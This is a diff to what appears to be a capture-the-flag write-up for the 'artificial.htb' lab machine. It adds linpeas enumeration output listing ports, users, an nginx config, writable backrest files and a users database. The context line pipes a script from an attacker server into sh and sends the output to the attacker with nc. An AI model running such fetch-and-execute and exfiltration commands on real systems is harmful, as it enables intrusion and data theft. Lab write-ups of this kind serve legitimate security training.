@@ -296,3 +296,80 @@ Once that's done, we download linpeas on the box from the attacker web server an
 curl 10.10.14.9:8888/linpeas.sh | sh | nc 10.10.14.9 9999
 ```
 
+```
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
+══╣ Active Ports (netstat)
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      6086/python3        
+tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      810/python3         
+tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                
+
+╔══════════╣ Users with console
+app:x:1001:1001:,,,:/home/app:/bin/bash
+gael:x:1000:1000:gael:/home/gael:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
+uid=1001(app) gid=1001(app) groups=1001(app)
+
+══╣ Logged in users (utmp)
+gael     + pts/0        2025-08-15 13:48 06:00        6094 (10.10.14.4)
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+lrwxrwxrwx 1 root root 34 Jun  2 07:38 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
+server {
+    listen 80 default_server;
+    listen [::]:80 default_server;
+    if ($host != artificial.htb) {
+        rewrite ^ http://artificial.htb/;
+    }
+    server_name artificial.htb;
+        access_log /var/log/nginx/application.access.log;
+        error_log /var/log/nginx/appliation.error.log;
+        location / {
+                include proxy_params;
+                proxy_pass http://127.0.0.1:5000;
+        }
+}
+
+╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
+/home/app
+/opt/backrest/backrest
+/opt/backrest/install.sh
+
+╔══════════╣ Executable files potentially added by user (limit 70)
+2025-06-09+09:47:50.9530830600 /usr/local/sbin/laurel
+2025-03-03+21:18:52.1240190480 /usr/local/bin/backrest
+2025-03-03+04:28:57.3479867980 /opt/backrest/install.sh
+
+╔══════════╣ Modified interesting files in the last 5mins (limit 100)
+/home/app/app/instance/users.db
+
+╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+Found /home/app/app/instance/users.db: SQLite 3.x database, last written using SQLite version 3031001
+
+╔══════════╣ Checking all env variables in /proc/*/environ removing duplicates and filtering out useless env vars
+HOME=/home/app
+LANG=en_US.UTF-8
+LOGNAME=app
+OLDPWD=/home/app/app
+OLDPWD=/tmp
+PWD=/home/app/app
+PWD=/tmp
+SERVER_SOFTWARE=gunicorn/20.0.4
+SHELL=/bin/bash
+SHLVL=0
+TF2_BEHAVIOR=1
+TPU_ML_PLATFORM=Tensorflow
+USER=app
+_=/usr/bin/dd
+_=/usr/bin/grep
+_=/usr/bin/xxd
+```
